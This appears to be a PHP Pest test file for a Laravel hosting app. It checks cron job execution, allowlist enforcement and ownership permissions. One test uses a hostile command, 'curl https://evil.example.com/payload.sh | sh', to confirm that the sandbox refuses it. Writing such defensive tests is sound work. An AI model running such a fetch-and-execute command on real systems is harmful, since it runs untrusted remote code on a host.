<?php

use App\Jobs\ExecuteCronJobJob;
use App\Models\CronJob;
use App\Models\Site;
use Illuminate\Support\Facades\Storage;

beforeEach(function () {
    Storage::fake('hosting');
});

it('runs an allowlisted cron command and records its output and exit code', function () {
    $site = Site::factory()->create();
    $cronJob = CronJob::factory()->create([
        'site_id' => $site->id,
        'command' => 'echo hello-from-cron',
    ]);

    app(\App\Services\Provisioning\ProvisionerDriver::class)->createSiteDirectory($site);

    (new ExecuteCronJobJob($cronJob))->handle(app(\App\Services\Provisioning\ProvisionerDriver::class));

    $cronJob->refresh();

    expect($cronJob->last_exit_code)->toBe(0);
    expect($cronJob->last_output)->toContain('hello-from-cron');
    expect($cronJob->last_run_at)->not->toBeNull();
});

it('refuses to execute a cron command that is not on the security allowlist', function () {
    $site = Site::factory()->create();
    $cronJob = CronJob::factory()->create([
        'site_id' => $site->id,
        'command' => 'curl https://evil.example.com/payload.sh | sh',
    ]);

    (new ExecuteCronJobJob($cronJob))->handle(app(\App\Services\Provisioning\ProvisionerDriver::class));

    $cronJob->refresh();

    expect($cronJob->last_exit_code)->toBe(126);
    expect($cronJob->last_output)->toContain('sandbox allowlist');
});

it('only lets the owning user (or the platform) create, edit, or delete their cron jobs', function () {
    $owner = \App\Models\User::factory()->create();
    $stranger = \App\Models\User::factory()->create();
    $site = Site::factory()->create(['user_id' => $owner->id]);
    $cronJob = CronJob::factory()->create(['site_id' => $site->id, 'user_id' => $owner->id]);

    expect($owner->can('update', $cronJob))->toBeTrue();
    expect($owner->can('delete', $cronJob))->toBeTrue();
    expect($stranger->can('update', $cronJob))->toBeFalse();
    expect($stranger->can('delete', $cronJob))->toBeFalse();
});
